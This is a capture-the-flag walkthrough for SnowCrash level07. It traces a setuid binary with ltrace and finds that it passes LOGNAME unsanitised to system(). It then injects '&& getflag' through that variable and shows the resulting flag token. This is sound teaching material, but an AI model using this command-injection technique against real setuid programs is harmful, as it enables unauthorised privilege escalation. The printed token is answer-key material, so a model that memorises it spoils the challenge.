# level07

## Hint

```shell-session
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

So we have an executable with an `suid` set to our target `flag07`.

If we execute the program:
```shell-session
level07@SnowCrash:~$ ./level07
level07
```

So what does the binary do anyway ?

## libtracing (ltrace)

On `ltrace` man page we can read:
> ltrace is a program that simply runs the specified command until it exits.
> It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process.
> It can also intercept and print the system calls executed by the program.

this tool will help us understand what's happening under-the-hood when a binary is fed to it as a parameter.

This is what we get with `level07` binary:
```shell-session
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffffd04, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                 = 2007
geteuid()                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
getenv("LOGNAME")                                         = "level07"
asprintf(0xbffffc54, 0x8048688, 0xbfffff42, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                    = 0
+++ exited (status 0) +++
```

There are two main piece of information to extract from this:
1. there is a call to `getenv()` which invokes the env variable `LOGNAME` and returns the string `level07`.
2. there is a call to the `echo` binary via the `system` function call.

A keen eye may already know how to exploit this.
Since there is a plain call to a system-wide binary `echo`, all we would have to do to make the binary call `getflag` for us would be to append a call to it in the env variable `LOGNAME`.

## getflag

```shell-session
level07@SnowCrash:~$ export LOGNAME="level07 && getflag"
level07@SnowCrash:~$ ./level07
level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

The reason we need to keep `level07` as part of the env variable is to keep the call to `echo` in the binary valid, and make it a full bash command of form `echo level07 && getflag`.
